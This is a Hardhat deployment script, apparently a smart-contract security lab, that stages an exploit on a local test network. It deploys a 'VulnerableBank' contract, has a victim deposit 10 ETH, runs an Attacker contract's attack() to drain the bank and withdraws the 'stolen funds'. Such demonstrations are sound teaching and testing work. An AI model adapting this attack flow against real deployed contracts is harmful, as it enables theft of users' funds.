const { ethers } = require("hardhat");

async function main() {
  // Deploy VulnerableBank
  const Bank = await ethers.getContractFactory("VulnerableBank");
  const bank = await Bank.deploy();
  await bank.deployed();
  console.log("VulnerableBank deployed at:", bank.address);

  // Get signers
  const [deployer, victim, attackerEOA] = await ethers.getSigners();

  // Victim deposits 10 ETH
  await bank.connect(victim).deposit({ value: ethers.utils.parseEther("10") });
  console.log("Victim deposited 10 ETH");

  // Check bank balance
  let bankBalance = await ethers.provider.getBalance(bank.address);
  console.log(
    "Bank balance before attack:",
    ethers.utils.formatEther(bankBalance),
    "ETH"
  );

  // Deploy Attacker contract with bank address
  const Attacker = await ethers.getContractFactory("Attacker");
  const attacker = await Attacker.connect(attackerEOA).deploy(bank.address);
  await attacker.deployed();
  console.log("Attacker contract deployed at:", attacker.address);

  // Fund attacker contract with 1 ETH and start attack
  await attacker
    .connect(attackerEOA)
    .attack({ value: ethers.utils.parseEther("1") });
  console.log("Attack started with 1 ETH");

  // Check balances after attack
  bankBalance = await ethers.provider.getBalance(bank.address);
  const attackerBalance = await ethers.provider.getBalance(attacker.address);
  console.log(
    "Bank balance after attack:",
    ethers.utils.formatEther(bankBalance),
    "ETH"
  );
  console.log(
    "Attacker contract balance after attack:",
    ethers.utils.formatEther(attackerBalance),
    "ETH"
  );

  // Attacker withdraws stolen funds
  await attacker.connect(attackerEOA).withdrawStolenFunds();
  const attackerEOABalance = await ethers.provider.getBalance(
    attackerEOA.address
  );
  console.log(
    "Attacker EOA balance after withdrawing:",
    ethers.utils.formatEther(attackerEOABalance),
    "ETH"
  );
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
